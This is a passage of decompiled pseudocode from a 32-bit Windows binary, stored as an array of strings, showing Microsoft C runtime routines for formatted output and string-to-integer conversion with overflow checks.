    "    return -1;",
    "  }",
    "  v14 = 0;",
    "  v8 = v15;",
    "  v12[0] = v15;",
    "  v12[1] = a4;",
    "  v13 = 0;",
    "  if ( (a1 & 2) != 0 || (LOBYTE(v14) = 0, !v15) )",
    "    LOBYTE(v14) = 1;",
    "  v15 = v12;",
    "  unknown_libname_9(&v15, a1, a2, a5, a6, a7);",
    "  v18 = 0;",
    "  v9 = __crt_stdio_output::output_processor<char,__crt_stdio_output::string_output_adapter<char>,__crt_stdio_output::standard_base<char,__crt_stdio_output::string_output_adapter<char>>>::process(v16);",
    "  v15 = (_DWORD *)v9;",
    "  if ( !v8 )",
    "    goto LABEL_28;",
    "  if ( (a1 & 1) != 0 )",
    "  {",
    "    if ( a4 || !v9 )",
    "    {",
    "      if ( v13 != a4 )",
    "      {",
    "        v8[v13] = 0;",
    "LABEL_28:",
    "        v11 = (int)v15;",
    "        goto LABEL_29;",
    "      }",
    "      if ( v9 < 0 || v9 <= a4 )",
    "        goto LABEL_28;",
    "    }",
    "    goto LABEL_24;",
    "  }",
    "  if ( (a1 & 2) != 0 )",
    "  {",
    "    if ( !a4 )",
    "      goto LABEL_28;",
    "    if ( v9 < 0 )",
    "    {",
    "      *v8 = 0;",
    "      goto LABEL_28;",
    "    }",
    "    v10 = v13;",
    "    if ( v13 == a4 )",
    "    {",
    "      v8[a4 - 1] = 0;",
    "      goto LABEL_28;",
    "    }",
    "    goto LABEL_27;",
    "  }",
    "  if ( a4 )",
    "  {",
    "    v10 = v13;",
    "    if ( v13 == a4 )",
    "    {",
    "      v8[a4 - 1] = 0;",
    "      v11 = -2;",
    "      goto LABEL_29;",
    "    }",
    "LABEL_27:",
    "    v8[v10] = 0;",
    "    goto LABEL_28;",
    "  }",
    "LABEL_24:",
    "  v11 = -1;",
    "LABEL_29:",
    "  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v17);",
    "  return v11;",
    "}",
    "",
    "",
    "int __cdecl common_vsprintf<__crt_stdio_output::standard_base,wchar_t>(",
    "        int a1,",
    "        int a2,",
    "        _DWORD *a3,",
    "        unsigned int a4,",
    "        int a5,",
    "        __crt_cached_ptd_host *a6,",
    "        int a7)",
    "{",
    "  _WORD *v8; // edi",
    "  int v9; // eax",
    "  int v10; // eax",
    "  int v11; // esi",
    "  _DWORD v12[2]; // [esp+Ch] [ebp-470h] BYREF",
    "  int v13; // [esp+14h] [ebp-468h]",
    "  int v14; // [esp+18h] [ebp-464h]",
    "  _DWORD *v15; // [esp+1Ch] [ebp-460h] BYREF",
    "  _BYTE v16[60]; // [esp+20h] [ebp-45Ch] BYREF",
    "  _BYTE v17[1044]; // [esp+5Ch] [ebp-420h] BYREF",
    "  int v18; // [esp+470h] [ebp-Ch]",
    "",
    "  v15 = a3;",
    "  if ( !a5 || a4 && !a3 )",
    "  {",
    "    *((_BYTE *)a6 + 28) = 1;",
    "    *((_DWORD *)a6 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a6);",
    "    return -1;",
    "  }",
    "  v14 = 0;",
    "  v8 = v15;",
    "  v12[0] = v15;",
    "  v12[1] = a4;",
    "  v13 = 0;",
    "  if ( (a1 & 2) != 0 || (LOBYTE(v14) = 0, !v15) )",
    "    LOBYTE(v14) = 1;",
    "  v15 = v12;",
    "  unknown_libname_10(&v15, a1, a2, a5, a6, a7);",
    "  v18 = 0;",
    "  v9 = __crt_stdio_output::output_processor<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>,__crt_stdio_output::standard_base<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>>>::process(v16);",
    "  v15 = (_DWORD *)v9;",
    "  if ( !v8 )",
    "    goto LABEL_28;",
    "  if ( (a1 & 1) != 0 )",
    "  {",
    "    if ( a4 || !v9 )",
    "    {",
    "      if ( v13 != a4 )",
    "      {",
    "        v8[v13] = 0;",
    "LABEL_28:",
    "        v11 = (int)v15;",
    "        goto LABEL_29;",
    "      }",
    "      if ( v9 < 0 || v9 <= a4 )",
    "        goto LABEL_28;",
    "    }",
    "    goto LABEL_24;",
    "  }",
    "  if ( (a1 & 2) != 0 )",
    "  {",
    "    if ( !a4 )",
    "      goto LABEL_28;",
    "    if ( v9 < 0 )",
    "    {",
    "      *v8 = 0;",
    "      goto LABEL_28;",
    "    }",
    "    v10 = v13;",
    "    if ( v13 == a4 )",
    "    {",
    "      v8[a4 - 1] = 0;",
    "      goto LABEL_28;",
    "    }",
    "    goto LABEL_27;",
    "  }",
    "  if ( a4 )",
    "  {",
    "    v10 = v13;",
    "    if ( v13 == a4 )",
    "    {",
    "      v8[a4 - 1] = 0;",
    "      v11 = -2;",
    "      goto LABEL_29;",
    "    }",
    "LABEL_27:",
    "    v8[v10] = 0;",
    "    goto LABEL_28;",
    "  }",
    "LABEL_24:",
    "  v11 = -1;",
    "LABEL_29:",
    "  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v17);",
    "  return v11;",
    "}",
    "",
    "",
    "int __thiscall __crt_stdio_output::formatting_buffer::count<char>(_DWORD *this)",
    "{",
    "  if ( this[257] )",
    "    return this[256] >> 1;",
    "  else",
    "    return 512;",
    "}",
    "",
    "",
    "int __thiscall __crt_stdio_output::formatting_buffer::count<wchar_t>(_DWORD *this)",
    "{",
    "  if ( this[257] )",
    "    return this[256] >> 2;",
    "  else",
    "    return 256;",
    "}",
    "",
    "",
    "char __thiscall sub_1001937A(_DWORD *this, unsigned int a2, int a3)",
    "{",
    "  char v5; // bl",
    "  unsigned int v6; // esi",
    "  void *v7; // eax",
    "  void *v8; // [esp+8h] [ebp-4h] BYREF",
    "",
    "  if ( a2 <= 0x7FFFFFFF )",
    "  {",
    "    v5 = 0;",
    "    v6 = 2 * a2;",
    "    if ( (this[257] || v6 > 0x400) && v6 > this[256] )",
    "    {",
    "      v7 = (void *)sub_100202D0(v6);",
    "      v8 = v7;",
    "      if ( v7 )",
    "      {",
    "        unknown_libname_11(&v8);",
    "        v7 = v8;",
    "        v5 = 1;",
    "        this[256] = v6;",
    "      }",
    "      _free_base(v7);",
    "      return v5;",
    "    }",
    "    else",
    "    {",
    "      return 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a3 + 28) = 1;",
    "    *(_DWORD *)(a3 + 24) = 12;",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "char __thiscall sub_100193FA(_DWORD *this, unsigned int a2, int a3)",
    "{",
    "  char v5; // bl",
    "  unsigned int v6; // esi",
    "  void *v7; // eax",
    "  void *v8; // [esp+8h] [ebp-4h] BYREF",
    "",
    "  if ( a2 <= 0x3FFFFFFF )",
    "  {",
    "    v5 = 0;",
    "    v6 = 4 * a2;",
    "    if ( (this[257] || v6 > 0x400) && v6 > this[256] )",
    "    {",
    "      v7 = (void *)sub_100202D0(v6);",
    "      v8 = v7;",
    "      if ( v7 )",
    "      {",
    "        unknown_libname_11(&v8);",
    "        v7 = v8;",
    "        v5 = 1;",
    "        this[256] = v6;",
    "      }",
    "      _free_base(v7);",
    "      return v5;",
    "    }",
    "    else",
    "    {",
    "      return 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a3 + 28) = 1;",
    "    *(_DWORD *)(a3 + 24) = 12;",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "bool __cdecl __crt_strtox::is_overflow_condition<unsigned long>(char a1, unsigned int a2)",
    "{",
    "  if ( (a1 & 4) == 0 )",
    "  {",
    "    if ( (a1 & 1) == 0 )",
    "      return 0;",
    "    if ( (a1 & 2) == 0 )",
    "      return a2 > 0x7FFFFFFF;",
    "    if ( a2 <= 0x80000000 )",
    "      return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool __cdecl __crt_stdio_output::is_wide_character_specifier<char>(int a1, int a2, char a3, int a4)",
    "{",
    "  return a4 != 2 && (a4 == 3 || a4 == 12 || a4 != 13 && a3 != 99 && a3 != 115);",
    "}",
    "",
    "",
    "char __cdecl __crt_stdio_output::is_wide_character_specifier<wchar_t>(char a1, int a2, __int16 a3, int a4)",
    "{",
    "  char v4; // al",
    "",
    "  if ( a4 == 2 )",
    "    return 0;",
    "  if ( a4 == 3 || a4 == 12 || a4 == 13 )",
    "    return 1;",
    "  v4 = 1;",
    "  if ( a3 == 99 || a3 == 115 )",
    "    v4 = 0;",
    "  return ((a1 & 4) != 0) ^ v4;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "_DWORD *__cdecl unknown_libname_8(_DWORD *a1, int a2, _DWORD *a3)",
    "{",
    "}int __cdecl sub_10019549(__crt_cached_ptd_host *a1, char *a2, char **a3, int a4, char a5)",
    "{",
    "  int v5; // esi",
    "  char v6; // bl",
    "  char *v7; // edi",
    "  char v8; // cl",
    "  int v9; // ecx",
    "  int v10; // eax",
    "  char v11; // al",
    "  char *v12; // edi",
    "  int v13; // eax",
    "  char v14; // di",
    "  unsigned int v15; // ecx",
    "  unsigned int v16; // ebx",
    "  bool v17; // cf",
    "  int v19; // esi",
    "  int v20; // [esp-8h] [ebp-24h]",
    "  char *v21; // [esp+8h] [ebp-14h]",
    "  unsigned int v22; // [esp+10h] [ebp-Ch]",
    "  char v23; // [esp+14h] [ebp-8h]",
    "  char v24; // [esp+18h] [ebp-4h]",
    "",
    "  v5 = a4;",
    "  if ( !(unsigned __int8)unknown_libname_17(&a2) )",
    "    goto LABEL_6;",
    "  if ( v5 && (v5 < 2 || v5 > 36) )",
    "  {",
    "    *((_BYTE *)a1 + 28) = 1;",
    "    *((_DWORD *)a1 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a1);",
    "LABEL_6:",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return 0;",
    "  }",
    "  v22 = 0;",
    "  v21 = a2;",
    "  v6 = *a2;",
    "  v7 = a2 + 1;",
    "  v24 = v6;",
    "  v8 = a5 | 2;",
    "  ++a2;",
    "  if ( v6 != 45 )",
    "    v8 = a5;",
    "  v23 = v8;",
    "  if ( v6 == 45 || v6 == 43 )",
    "  {",
    "    v6 = *v7++;",
    "    v24 = v6;",
    "    a2 = v7;",
    "  }",
    "  v9 = 16;",
    "  if ( v5 && v5 != 16 )",
    "    goto LABEL_32;",
    "  if ( (unsigned __int8)(v6 - 48) > 9u )",
    "  {",
    "    if ( (unsigned __int8)(v6 - 97) > 0x19u )",
    "    {",
    "      if ( (unsigned __int8)(v6 - 65) > 0x19u )",
    "      {",
    "LABEL_28:",
    "        v20 = 10;",
    "        goto LABEL_29;",
    "      }",
    "      v10 = v6 - 55;",
    "    }",
    "    else",
    "    {",
    "      v10 = v6 - 87;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v10 = v6 - 48;",
    "  }",
    "  if ( v10 )",
    "    goto LABEL_28;",
    "  v11 = *v7;",
    "  v12 = v7 + 1;",
    "  a2 = v12;",
    "  if ( v11 != 120 && v11 != 88 )",
    "  {",
    "    __crt_strtox::c_string_character_source<char>::unget(v11);",
    "    v20 = 8;",
    "LABEL_29:",
    "    v13 = v20;",
    "    if ( v5 )",
    "      v13 = v5;",
    "    v5 = v13;",
    "    goto LABEL_32;",
    "  }",
    "  v6 = *v12;",
    "  v24 = *v12;",
    "  a2 = v12 + 1;",
    "  if ( v5 )",
    "    v9 = v5;",
    "  v5 = v9;",
    "LABEL_32:",
    "  v14 = v23;",
    "  while ( 1 )",
    "  {",
    "    if ( (unsigned __int8)(v6 - 48) > 9u )",
    "    {",
    "      if ( (unsigned __int8)(v6 - 97) > 0x19u )",
    "        v15 = (unsigned __int8)(v6 - 65) > 0x19u ? -1 : v6 - 55;",
    "      else",
    "        v15 = v6 - 87;",
    "    }",
    "    else",
    "    {",
    "      v15 = v6 - 48;",
    "    }",
    "    if ( v15 >= v5 )",
    "      break;",
    "    v16 = v22;",
    "    v17 = v5 * v22 + v15 < v5 * v22;",
    "    v22 = v5 * v22 + v15;",
    "    v14 |= (4 * (0xFFFFFFFF / v5 < v16 || v17)) | 8;",
    "    v6 = *a2;",
    "    v24 = *a2++;",
    "  }",
    "  __crt_strtox::c_string_character_source<char>::unget(v24);",
    "  if ( (v14 & 8) == 0 )",
    "  {",
    "    if ( a3 )",
    "      *a3 = v21;",
    "    return 0;",
    "  }",
    "  v19 = v22;",
    "  if ( !__crt_strtox::is_overflow_condition<unsigned long>(v14, v22) )",
    "  {",
    "    if ( (v14 & 2) != 0 )",
    "      v19 = -v22;",
    "    goto LABEL_58;",
    "  }",
    "  *((_BYTE *)a1 + 28) = 1;",
    "  *((_DWORD *)a1 + 6) = 34;",
    "  if ( (v14 & 1) == 0 )",
    "  {",
    "    v19 = -1;",
    "LABEL_58:",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return v19;",
    "  }",
    "  if ( (v14 & 2) != 0 )",
    "  {",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return 0x80000000;",
    "  }",
    "  else",
    "  {",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return 0x7FFFFFFF;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl sub_1001975C(__crt_cached_ptd_host *a1, _WORD *a2, _DWORD *a3, int a4, char a5)",
    "{",
    "  unsigned int v5; // edi",
    "  int v6; // esi",
    "  _WORD *v7; // ecx",
    "  char v8; // bl",
    "  int v9; // edx",
    "  int v10; // eax",
    "  int v11; // eax",
    "  unsigned int v12; // ecx",
    "  int v13; // eax",
    "  _WORD *v14; // ecx",
    "  unsigned int v15; // eax",
    "  unsigned int v16; // edi",
    "  int v17; // eax",
    "  unsigned __int16 v18; // cx",
    "  unsigned int v19; // ecx",
    "  int v20; // ecx",
    "  unsigned int v21; // edx",
    "  bool v22; // cl",
    "  bool v23; // cf",
    "  int v25; // esi",
    "  int v26; // [esp-4h] [ebp-18h]",
    "  _WORD *v27; // [esp+Ch] [ebp-8h]",
    "  unsigned int v28; // [esp+10h] [ebp-4h]",
    "",
    "  if ( !(unsigned __int8)unknown_libname_17(&a2) )",
    "    goto LABEL_6;",
    "  v5 = a4;",
    "  if ( a4 && (a4 < 2 || a4 > 36) )",
    "  {",
    "    *((_BYTE *)a1 + 28) = 1;",
    "    *((_DWORD *)a1 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a1);",
    "LABEL_6:",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return 0;",
    "  }",
    "  v28 = 0;",
    "  v27 = a2;",
    "  v6 = (unsigned __int16)*a2;",
    "  v7 = ++a2;",
    "  v8 = a5 | 2;",
    "  if ( (_WORD)v6 == 45 || (v8 = a5, v6 == 43) )",
    "  {",
    "    LOWORD(v6) = *v7++;",
    "    a2 = v7;",
    "  }",
    "  v9 = 16;",
    "  if ( a4 && a4 != 16 )",
    "    goto LABEL_87;",
    "  if ( (unsigned __int16)v6 >= 0x30u )",
    "  {",
    "    if ( (unsigned __int16)v6 < 0x3Au )",
    "    {",
    "      v10 = (unsigned __int16)v6 - 48;",
    "      goto LABEL_67;",
    "    }",
    "    if ( (unsigned __int16)v6 >= 0xFF10u )",
    "    {",
    "      if ( (unsigned __int16)v6 < 0xFF1Au )",
    "      {",
    "        v10 = (unsigned __int16)v6 - 65296;",
    "LABEL_67:",
    "        if ( v10 != -1 )",
    "          goto LABEL_75;",
    "      }",
    "    }",
    "    else if ( (unsigned __int16)v6 >= 0x660u )",
    "    {",
    "      if ( (unsigned __int16)v6 < 0x66Au )",
    "      {",
    "        v10 = (unsigned __int16)v6 - 1632;",
    "        goto LABEL_67;",
    "      }",
    "      if ( (unsigned __int16)v6 >= 0x6F0u )",
    "      {",
    "        if ( (unsigned __int16)v6 < 0x6FAu )",
    "        {",
    "          v10 = (unsigned __int16)v6 - 1776;",
    "          goto LABEL_67;",
    "        }",
    "        if ( (unsigned __int16)v6 >= 0x966u )",
    "        {",
    "          if ( (unsigned __int16)v6 < 0x970u )",
    "          {",
    "            v10 = (unsigned __int16)v6 - 2406;",
    "            goto LABEL_67;",
    "          }",
    "          if ( (unsigned __int16)v6 >= 0x9E6u )",
    "          {",
    "            if ( (unsigned __int16)v6 < 0x9F0u )",
    "            {",
    "              v10 = (unsigned __int16)v6 - 2534;",
    "              goto LABEL_67;",
    "            }",
    "            if ( (unsigned __int16)v6 >= 0xA66u )",
    "            {",
    "              if ( (unsigned __int16)v6 < 0xA70u )",
    "              {",
    "                v10 = (unsigned __int16)v6 - 2662;",
    "                goto LABEL_67;",
    "              }",
    "              if ( (unsigned __int16)v6 >= 0xAE6u )",
    "              {",
    "                if ( (unsigned __int16)v6 < 0xAF0u )",
    "                {",
    "                  v10 = (unsigned __int16)v6 - 2790;",
    "                  goto LABEL_67;",
    "                }",
    "                if ( (unsigned __int16)v6 >= 0xB66u )",
    "                {",
    "                  if ( (unsigned __int16)v6 < 0xB70u )",
    "                  {",
    "                    v10 = (unsigned __int16)v6 - 2918;",
    "                    goto LABEL_67;",
    "                  }",
    "                  if ( (unsigned __int16)v6 >= 0xC66u )",
    "                  {",
    "                    if ( (unsigned __int16)v6 < 0xC70u )",
    "                    {",
    "                      v10 = (unsigned __int16)v6 - 3174;",
    "                      goto LABEL_67;",
    "                    }",
    "                    if ( (unsigned __int16)v6 >= 0xCE6u )",
    "                    {",
    "                      if ( (unsigned __int16)v6 < 0xCF0u )",
    "                      {",
    "                        v10 = (unsigned __int16)v6 - 3302;",
    "                        goto LABEL_67;",
    "                      }",
    "                      if ( (unsigned __int16)v6 >= 0xD66u )",
    "                      {",
    "                        if ( (unsigned __int16)v6 < 0xD70u )",
    "                        {",
    "                          v10 = (unsigned __int16)v6 - 3430;",
    "                          goto LABEL_67;",
    "                        }",
    "                        if ( (unsigned __int16)v6 >= 0xE50u )",
    "                        {",
    "                          if ( (unsigned __int16)v6 < 0xE5Au )",
    "                          {",
    "                            v10 = (unsigned __int16)v6 - 3664;",
    "                            goto LABEL_67;",
    "                          }",
    "                          if ( (unsigned __int16)v6 >= 0xED0u )",
    "                          {",
    "                            if ( (unsigned __int16)v6 < 0xEDAu )",
    "                            {",
    "                              v10 = (unsigned __int16)v6 - 3792;",
    "                              goto LABEL_67;",
    "                            }",
    "                            if ( (unsigned __int16)v6 >= 0xF20u )",
    "                            {",
    "                              if ( (unsigned __int16)v6 < 0xF2Au )",
    "                              {",
    "                                v10 = (unsigned __int16)v6 - 3872;",
    "                                goto LABEL_67;",
    "                              }",
    "                              if ( (unsigned __int16)v6 >= 0x1040u )",
    "                              {",
    "                                if ( (unsigned __int16)v6 < 0x104Au )",
    "                                {",
    "                                  v10 = (unsigned __int16)v6 - 4160;",
    "                                  goto LABEL_67;",
    "                                }",
    "                                if ( (unsigned __int16)v6 >= 0x17E0u )",
    "                                {",
    "                                  if ( (unsigned __int16)v6 < 0x17EAu )",
    "                                  {",
    "                                    v10 = (unsigned __int16)v6 - 6112;",
    "                                    goto LABEL_67;",
    "                                  }",
    "                                  if ( (unsigned __int16)v6 >= 0x1810u && (unsigned __int16)v6 < 0x181Au )",
    "                                  {",
    "                                    v10 = (unsigned __int16)v6 - 6160;",
    "                                    goto LABEL_67;",
    "                                  }",
    "                                }",
    "                              }",
    "                            }",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "        }",
    "      }",
    "    }",
    "  }",
    "  v11 = (unsigned __int16)v6;",
    "  if ( (unsigned __int16)v6 < 0x41u || (unsigned __int16)v6 > 0x5Au )",
    "  {",
    "    v12 = (unsigned __int16)v6 - 97;",
    "    if ( v12 > 0x19 )",
    "    {",
    "LABEL_82:",
    "      v26 = 10;",
    "      goto LABEL_83;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v12 = (unsigned __int16)v6 - 97;",
    "  }",
    "  if ( v12 <= 0x19 )",
    "    v11 = (unsigned __int16)v6 - 32;",
    "  v7 = a2;",
    "  v10 = v11 - 55;",
    "LABEL_75:",
    "  if ( v10 )",
    "    goto LABEL_82;",
    "  v13 = (unsigned __int16)*v7;",
    "  v14 = v7 + 1;",
    "  a2 = v14;",
    "  if ( v13 == 120 || v13 == 88 )",
    "  {",
    "    LOWORD(v6) = *v14;",
    "    a2 = v14 + 1;",
    "    if ( a4 )",
    "      v9 = a4;",
    "    v5 = v9;",
    "    goto LABEL_86;",
    "  }",
    "  __crt_strtox::c_string_character_source<wchar_t>::unget(v13);",
    "  v26 = 8;",
    "LABEL_83:",
    "  v15 = v26;",
    "  if ( v5 )",
    "    v15 = v5;",
    "  v5 = v15;",
    "LABEL_86:",
    "  a4 = v5;",
    "LABEL_87:",
    "  v16 = 0xFFFFFFFF / v5;",
    "  while ( 1 )",
    "  {",
    "    v17 = 48;",
    "    if ( (unsigned __int16)v6 < 0x30u )",
    "      goto LABEL_126;",
    "    if ( (unsigned __int16)v6 < 0x3Au )",
    "      goto LABEL_125;",
    "    v17 = 65296;",
    "    if ( (unsigned __int16)v6 >= 0xFF10u )",
    "    {",
    "      v18 = -230;",
    "LABEL_124:",
    "      if ( (unsigned __int16)v6 < v18 )",
    "      {",
    "LABEL_125:",
    "        v19 = (unsigned __int16)v6 - v17;",
    "        if ( v19 != -1 )",
    "          goto LABEL_134;",
    "        goto LABEL_126;",
    "      }",
    "      goto LABEL_126;",
    "    }",
    "    v17 = 1632;",
    "    if ( (unsigned __int16)v6 >= 0x660u )",
    "    {",
    "      if ( (unsigned __int16)v6 < 0x66Au )",
    "        goto LABEL_125;",
    "      v17 = 1776;",
    "      if ( (unsigned __int16)v6 >= 0x6F0u )",
    "      {",
    "        if ( (unsigned __int16)v6 < 0x6FAu )",
    "          goto LABEL_125;",
    "        v17 = 2406;",
    "        if ( (unsigned __int16)v6 >= 0x966u )",
    "        {",
    "          if ( (unsigned __int16)v6 < 0x970u )",
    "            goto LABEL_125;",
    "          v17 = 2534;",
    "          if ( (unsigned __int16)v6 >= 0x9E6u )",
    "          {",
    "            if ( (unsigned __int16)v6 < 0x9F0u )",
    "              goto LABEL_125;",
    "            v17 = 2662;",
    "            if ( (unsigned __int16)v6 >= 0xA66u )",
    "            {",
    "              if ( (unsigned __int16)v6 < 0xA70u )",
    "                goto LABEL_125;",
    "              v17 = 2790;",
    "              if ( (unsigned __int16)v6 >= 0xAE6u )",
    "              {",
    "                if ( (unsigned __int16)v6 < 0xAF0u )",
    "                  goto LABEL_125;",
    "                v17 = 2918;",
    "                if ( (unsigned __int16)v6 >= 0xB66u )",
    "                {",
    "                  if ( (unsigned __int16)v6 < 0xB70u )",
    "                    goto LABEL_125;",
    "                  v17 = 3174;",
    "                  if ( (unsigned __int16)v6 >= 0xC66u )",
    "                  {",
    "                    if ( (unsigned __int16)v6 < 0xC70u )",
    "                      goto LABEL_125;",
    "                    v17 = 3302;",
    "                    if ( (unsigned __int16)v6 >= 0xCE6u )",
    "                    {",
    "                      if ( (unsigned __int16)v6 < 0xCF0u )",
    "                        goto LABEL_125;",
    "                      v17 = 3430;",
    "                      if ( (unsigned __int16)v6 >= 0xD66u )",
    "                      {",
    "                        if ( (unsigned __int16)v6 < 0xD70u )",
    "                          goto LABEL_125;",
    "                        v17 = 3664;",
    "                        if ( (unsigned __int16)v6 >= 0xE50u )",
    "                        {",
    "                          if ( (unsigned __int16)v6 < 0xE5Au )",
    "                            goto LABEL_125;",
    "                          v17 = 3792;",
    "                          if ( (unsigned __int16)v6 >= 0xED0u )",
    "                          {",
    "                            if ( (unsigned __int16)v6 < 0xEDAu )",
    "                              goto LABEL_125;",
    "                            v17 = 3872;",
    "                            if ( (unsigned __int16)v6 >= 0xF20u )",
    "                            {",
    "                              if ( (unsigned __int16)v6 < 0xF2Au )",
    "                                goto LABEL_125;",
    "                              v17 = 4160;",
    "                              if ( (unsigned __int16)v6 >= 0x1040u )",
    "                              {",
    "                                if ( (unsigned __int16)v6 < 0x104Au )",
    "                                  goto LABEL_125;",
    "                                v17 = 6112;",
    "                                if ( (unsigned __int16)v6 >= 0x17E0u )",
    "                                {",
    "                                  if ( (unsigned __int16)v6 < 0x17EAu )",
    "                                    goto LABEL_125;",
    "                                  v17 = 6160;",
    "                                  if ( (unsigned __int16)v6 >= 0x1810u )",
    "                                  {",
    "                                    v18 = 6170;",
    "                                    goto LABEL_124;",
    "                                  }",
    "                                }",
    "                              }",
    "                            }",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "        }",
    "      }",
    "    }",
    "LABEL_126:",
    "    if ( ((v20 = (unsigned __int16)v6, (unsigned __int16)v6 < 0x41u) || (unsigned __int16)v6 > 0x5Au)",
    "      && ((unsigned __int16)v6 < 0x61u || (unsigned __int16)v6 > 0x7Au) )",
    "    {",
    "      v19 = -1;",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned __int16)(v6 - 97) <= 0x19u )",
    "        v20 = (unsigned __int16)v6 - 32;",
    "      v19 = v20 - 55;",
    "    }",
    "LABEL_134:",
    "    if ( v19 >= a4 )",
    "      break;",
    "    v21 = a4 * v28 + v19;",
    "    v22 = v21 < a4 * v28;",
    "    v23 = v16 < v28;",
    "    v28 = v21;",
    "    v8 |= (4 * (v23 || v22)) | 8;",
    "    LOWORD(v6) = *a2++;",
    "  }",
    "  __crt_strtox::c_string_character_source<wchar_t>::unget(v6);",
    "  if ( (v8 & 8) != 0 )",
    "  {",
    "    v25 = v28;",
    "    if ( __crt_strtox::is_overflow_condition<unsigned long>(v8, v28) )",
    "    {",
    "      *((_BYTE *)a1 + 28) = 1;",
    "      *((_DWORD *)a1 + 6) = 34;",
    "      if ( (v8 & 1) != 0 )",
    "      {",
    "        if ( (v8 & 2) != 0 )",
    "        {",
    "          if ( a3 )",
    "            *a3 = a2;",
    "          return 0x80000000;",
    "        }",
    "        else",
    "        {",
    "          if ( a3 )",
    "            *a3 = a2;",
    "          return 0x7FFFFFFF;",
    "        }",
    "      }",
    "      v25 = -1;",
    "    }",
    "    else if ( (v8 & 2) != 0 )",
    "    {",
    "      v25 = -v28;",
    "    }",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return v25;",
    "  }",
    "  if ( a3 )",
    "    *a3 = v27;",
    "  return 0;",
    "}",
    "",
    "",
    "char *__thiscall __crt_stdio_output::formatting_buffer::scratch_data<char>(_DWORD *this)",
    "{",
    "  int v2; // edi",
    "  int v3; // eax",
    "",
    "  v2 = this[257];",
    "  v3 = __crt_stdio_output::formatting_buffer::count<char>(this);",
    "  if ( v2 )",
    "    return (char *)(v2 + v3);",
    "  else",
    "    return (char *)this + v3;",
    "}",
    "",
    "",
    "char __thiscall sub_10019D5E(int this, int a2)",
    "{",
    "  int v3; // eax",
    "  int v4; // eax",
    "  __int64 *v6; // ecx",
    "  int v7; // edi",
    "  __int64 v8; // rax",
    "  _DWORD *v9; // eax",
    "  _DWORD *v10; // ecx",
    "  unsigned __int16 *v11; // ecx",
    "  unsigned __int8 *v12; // ecx",
    "  unsigned int v13; // edx",
    "  int v14; // ecx",
    "  unsigned int v15; // [esp-8h] [ebp-20h]",
    "  int v16; // [esp-4h] [ebp-1Ch]",
    "  int v17; // [esp+Ch] [ebp-Ch]",
    "  int v18; // [esp+10h] [ebp-8h]",
    "  unsigned int v19; // [esp+10h] [ebp-8h]",
    "  int v20; // [esp+14h] [ebp-4h]",
    "",
    "  v3 = sub_1001C178(*(_DWORD *)(this + 40));",
    "  v17 = v3;",
    "  switch ( v3 )",
    "  {",
    "    case 1:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v12 = *(unsigned __int8 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v12 + 4;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (char)*v12;",
    "      else",
    "        LODWORD(v8) = *v12;",
    "      break;",
    "    case 2:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v11 = *(unsigned __int16 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v11 + 2;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (__int16)*v11;",
    "      else",
    "        LODWORD(v8) = *v11;",
    "      break;",
    "    case 4:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      if ( (v7 & 0x10) == 0 )",
    "      {",
    "        v10 = *(_DWORD **)(this + 16);",
    "        v18 = 0;",
    "        *(_DWORD *)(this + 16) = v10 + 1;",
    "        LODWORD(v8) = *v10;",
    "        goto LABEL_18;",
    "      }",
    "      v9 = *(_DWORD **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v9 + 1;",
    "      LODWORD(v8) = *v9;",
    "      break;",
    "    case 8:",
    "      v6 = *(__int64 **)(this + 16);",
    "      v7 = *(_DWORD *)(this + 28);",
    "      *(_DWORD *)(this + 16) = v6 + 1;",
    "      v8 = *v6;",
    "      goto LABEL_17;",
    "    default:",
    "      v4 = *(_DWORD *)(this + 8) + 24;",
    "      *(_BYTE *)(v4 + 4) = 1;",
    "      *(_DWORD *)v4 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "      return 0;",
    "  }",
    "  v8 = (int)v8;",
    "LABEL_17:",
    "  v18 = HIDWORD(v8);",
    "LABEL_18:",
    "  v13 = v18;",
    "  v14 = v8;",
    "  if ( (v7 & 0x10) != 0 && v18 < 0 )",
    "  {",
    "    v14 = -(int)v8;",
    "    v13 = (unsigned __int64)-__SPAIR64__(v18, v8) >> 32;",
    "    v7 |= 0x40u;",
    "    *(_DWORD *)(this + 28) = v7;",
    "  }",
    "  v19 = v13;",
    "  v20 = v14;",
    "  if ( *(int *)(this + 36) >= 0 )",
    "  {",
